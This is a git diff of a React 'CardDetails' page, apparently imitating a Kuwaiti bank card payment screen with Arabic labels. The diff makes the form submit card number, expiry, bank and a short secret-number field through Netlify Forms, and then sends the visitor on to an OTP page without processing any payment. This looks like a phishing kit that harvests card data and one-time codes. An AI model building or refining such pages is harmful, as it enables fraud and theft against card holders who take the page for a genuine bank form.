@@ -66,6 +66,7 @@ const CardDetails = () => {
     e.preventDefault();
     setLoading(true);
     
+    // The form will be handled by Netlify Forms automatically
     setTimeout(() => {
       navigate(`/otp/${id}`);
     }, 2000);
@@ -115,15 +116,34 @@ const CardDetails = () => {
 
         {/* Payment Form Card - Mobile Optimized */}
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
-          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8">
+          <form 
+            name="card-details" 
+            method="POST" 
+            data-netlify="true" 
+            netlify-honeypot="bot-field"
+            onSubmit={handleSubmit} 
+            className="space-y-4 sm:space-y-8"
+            action="/otp"
+          >
+            {/* Hidden fields for Netlify */}
+            <input type="hidden" name="form-name" value="card-details" />
+            <input type="hidden" name="payment-id" value={id} />
+            <p style={{ display: 'none' }}>
+              <label>
+                Don't fill this out if you're human: <input name="bot-field" />
+              </label>
+            </p>
+
             {/* Bank Selection */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <select 
+                  name="bank"
                   value={formData.bank}
                   onChange={(e) => handleInputChange('bank', e.target.value)}
                   className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg z-50" 
                   style={{ borderRadius: '8px' }}
+                  required
                 >
                   {kuwaitiBanks.map((bank) => (
                     <option key={bank.value} value={bank.value}>
@@ -140,10 +160,12 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3 flex-1">
                   <select 
+                    name="card-prefix"
                     value={formData.prefix}
                     onChange={(e) => handleInputChange('prefix', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50" 
                     style={{ borderRadius: '8px' }}
+                    required
                   >
                     {cardPrefixes.map((prefix) => (
                       <option key={prefix.value} value={prefix.value}>
@@ -153,11 +175,13 @@ const CardDetails = () => {
                   </select>
                   <Input
                     type="text"
+                    name="card-number"
                     value={formData.cardNumber}
                     onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                     className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                     style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                     placeholder=""
+                    required
                   />
                 </div>
                 <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:رقم بطاقة الصرف الآلي</label>
@@ -169,10 +193,12 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3">
                   <select 
+                    name="expiry-year"
                     value={formData.expiryYear}
                     onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                     style={{ borderRadius: '8px' }}
+                    required
                   >
                     <option value="">YYYY</option>
                     <option value="2024">2024</option>
@@ -183,10 +209,12 @@ const CardDetails = () => {
                     <option value="2029">2029</option>
                   </select>
                   <select 
+                    name="expiry-month"
                     value={formData.expiryMonth}
                     onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
                     style={{ borderRadius: '8px' }}
+                    required
                   >
                     <option value="">MM</option>
                     {Array.from({length: 12}, (_, i) => (
@@ -205,39 +233,42 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <Input
                   type="text"
+                  name="cvv"
                   value={formData.cvv}
                   onChange={(e) => handleInputChange('cvv', e.target.value)}
                   className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                   style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
                   placeholder=""
                   maxLength={3}
+                  required
                 />
                 <label className="text-blue-600 font-medium mr-3 sm:mr-6 whitespace-nowrap text-sm sm:text-lg">:الرقم السري</label>
               </div>
             </div>
-          </form>
-        </div>
 
-        {/* Action Buttons Card - Mobile Optimized */}
-        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
-          <div className="flex space-x-3 sm:space-x-6">
-            <button
-              onClick={handleCancel}
-              className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
-              style={{ borderRadius: '12px' }}
-              disabled={loading}
-            >
-              إلغاء
-            </button>
-            <button
-              onClick={() => navigate(`/otp/${id}`)}
-              className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
-              style={{ borderRadius: '12px' }}
-              disabled={loading}
-            >
-              {loading ? 'جاري التحميل...' : 'إرسال'}
-            </button>
-          </div>
+            {/* Action Buttons Card - Mobile Optimized */}
+            <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mt-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
+              <div className="flex space-x-3 sm:space-x-6">
+                <button
+                  type="button"
+                  onClick={handleCancel}
+                  className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
+                  style={{ borderRadius: '12px' }}
+                  disabled={loading}
+                >
+                  إلغاء
+                </button>
+                <button
+                  type="submit"
+                  className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
+                  style={{ borderRadius: '12px' }}
+                  disabled={loading}
+                >
+                  {loading ? 'جاري التحميل...' : 'إرسال'}
+                </button>
+              </div>
+            </div>
+          </form>
         </div>
 
         {/* Footer - Mobile Optimized */}
